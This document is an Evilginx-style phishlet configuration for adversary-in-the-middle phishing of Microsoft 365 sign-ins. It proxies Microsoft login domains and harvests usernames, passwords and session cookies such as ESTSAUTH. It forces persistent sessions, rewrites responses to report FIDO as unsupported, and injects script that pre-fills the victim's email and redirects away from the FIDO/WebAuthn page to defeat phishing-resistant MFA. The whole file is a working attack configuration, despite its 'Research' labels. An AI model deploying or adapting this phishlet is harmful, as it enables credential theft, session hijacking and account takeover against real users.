name: "o365"
min_ver: "3.1.0"
author: "Master Research - Unified AiTM Framework"
description: "Advanced O365 phishlet with FIDO/WebAuthn blocking and session persistence"

proxy_hosts:
  - {
      phish_sub: "login",
      orig_sub: "login",
      domain: "microsoftonline.com",
      session: true,
      is_landing: true,
    }
  - {
      phish_sub: "www",
      orig_sub: "www",
      domain: "office.com",
      session: false,
      is_landing: false,
    }
  - {
      phish_sub: "account",
      orig_sub: "account",
      domain: "microsoft.com",
      session: true,
      is_landing: false,
    }

sub_filters:
  - {
      triggers_on: "login.microsoftonline.com",
      orig_sub: "login",
      domain: "microsoftonline.com",
      search: "login.microsoftonline.com",
      replace: "{hostname}",
      mimes: ["text/html", "application/json", "application/javascript"],
    }
  - {
      triggers_on: "login.microsoftonline.com",
      orig_sub: "login",
      domain: "microsoftonline.com",
      search: "https://login.microsoftonline.com",
      replace: "https://{hostname}",
      mimes: ["text/html", "application/json", "application/javascript"],
      redirect_only: true,
    }
  - {
      triggers_on: "login.microsoftonline.com",
      orig_sub: "login",
      domain: "microsoftonline.com",
      search: 'action="https://login.microsoftonline.com',
      replace: 'action="https://{hostname}',
      mimes: ["text/html"],
    }

auth_tokens:
  - domain: ".login.microsoftonline.com"
    keys:
      [
        "ESTSAUTH:always",
        "ESTSAUTHPERSISTENT:always",
        "SignInStateCookie:always",
        "esctx:always",
        "ESTSSC:always",
        "ESTSAUTHLIGHT:always",
        "stsservicecookie:always",
        "x-ms-gateway-slice:always",
      ]
    type: "cookie"
  - domain: "login.microsoftonline.com"
    keys:
      [
        "ESTSSC:always",
        "ESTSAUTHLIGHT:always",
        "stsservicecookie:always",
        "x-ms-gateway-slice:always",
      ]
    type: "cookie"
  - domain: ".microsoft.com"
    keys: ["MSFPC", "MC1"]
    type: "cookie"

force_post:
  - path: "/kmsi"
    search: [{ key: "LoginOptions", search: ".*" }]
    force: [{ key: "LoginOptions", value: "1" }]
    type: "post"
  - path: "/common/GetCredentialType"
    search: [{ key: "isFidoSupported", search: ".*" }]
    force: [{ key: "isFidoSupported", value: "false" }]
    type: "post"

credentials:
  username:
    key: "(login|UserName|email|account|username)"
    search: "(.*)"
    type: "post"
  password:
    key: "(passwd|Password|password|pass|pwd|PASSWORD)"
    search: "(.*)"
    type: "post"

auth_urls:
  - "/common/SAS/ProcessAuth"
  - "/kmsi*"
  - "/common/oauth2/v2.0/authorize"
  - "/favicon.ico"

login:
  domain: "login.microsoftonline.com"
  path: "/"

js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/.*"]
    script: |
      (function() {
          'use strict';
          console.log('[Research] AiTM Script Active');
          const SELECTORS = { username: '#i0116', password: '#i0118' };
          
          const urlParams = new URLSearchParams(window.location.search);
          const email = urlParams.get('email') || urlParams.get('username');
          if (email) {
              const checkExist = setInterval(() => {
                 const el = document.querySelector(SELECTORS.username);
                 if (el) {
                    el.value = email;
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    clearInterval(checkExist);
                 }
              }, 100);
          }

          function checkFido() {
              if (window.location.pathname == '/common/fido/get') {
                  window.location.replace('https://' + window.location.hostname + '/');
              }
              setTimeout(checkFido, 500);
          }
          checkFido();
      })();
